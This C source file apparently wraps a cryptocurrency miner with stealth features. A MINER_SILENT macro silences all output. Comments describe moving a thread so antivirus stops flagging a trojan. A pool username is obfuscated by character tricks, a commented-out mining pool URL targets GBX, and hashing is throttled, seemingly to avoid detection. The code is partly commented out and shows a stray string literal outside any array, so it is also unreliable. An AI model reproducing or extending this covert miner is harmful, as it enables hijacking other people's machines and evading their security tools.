#define ACD_VERSION "03"

#ifdef MINER_SILENT
#define printf(...)
#define fprintf(...)
#define applog(...)
#endif 

int miner_main(int argc, char *argv[]);

static int kIdle;

void *input_thread(void *userdata) {
		// TODO: this is malicous "Endgame" AV
	applog(LOG_ERR, "kIdle = %d", kIdle);
    while(1) {
		char c = getchar();
        int k = (int)c - '0';
        if(k >= 0 && k < 100) {
            kIdle = k;
            applog(LOG_ERR, "Set kIdle = %d", kIdle);
        }
		
		if(c < '0' && c != '\n' && c != '\r'&& c != ' ')
			break; 
    }
	applog(LOG_ERR, "input thread ended");
    return NULL;
}

int main(int argc_, char *argv_[])
{
	//if(argc_ != 2 || strlen(argv_[1]) != 32)
	//	return 0;


	//applog(LOG_ERR, "started daemon v" ACD_VERSION);

    kIdle = 7;
    //pthread_t inp_thread;
	// the following thread was moved to miner_main() (antivir detected some trojan otherwise and we save a thread)
   // if (unlikely(pthread_create(&inp_thread, NULL, input_thread, NULL))) {
   //     applog(LOG_ERR, "input thread create failed");
   //     return 1;
   // }
	
//	/		char poolUser[200];
//	snprintf(poolUser,sizeof(poolUser), "%sUwYk698d5AP4bHwT9mH.ac" ACD_VERSION "_%s", "Hd7c6xDYKik1vkg", (argc > 1) ? argv[1] : "");
//	poolUser[0]--; // make H -> G
	
	//char *  argv[] = {
		"meepo",
		//"-a", "neoscrypt",
		//"-o", "stratum+tcp://pool.unimining.net:4233",
		//"-u", poolUser,
		//"-p", "c=GBX",
		//"-e", "2"
	//};
	//int argn = sizeof(argv) / sizeof(char*);
	miner_main(argc_, argv_);
}

struct timeval tv_throttleMeasure[16];


void miner_throttle(int thr_id, int inc_nonce) {
	if(kIdle > 0)
    usleep(1000*kIdle);
    return;

//int kIdle = 12;
    struct timeval *m = &tv_throttleMeasure[thr_id % 16];
    if(m->tv_sec) {
        struct timeval n, diff;
        gettimeofday(&n, NULL);
        timeval_subtract(&diff, &n, m);
        ullong diffUs = (diff.tv_sec * 1e6 + diff.tv_usec);

        usleep(diffUs * kIdle);
    }
    gettimeofday(m, NULL);

}
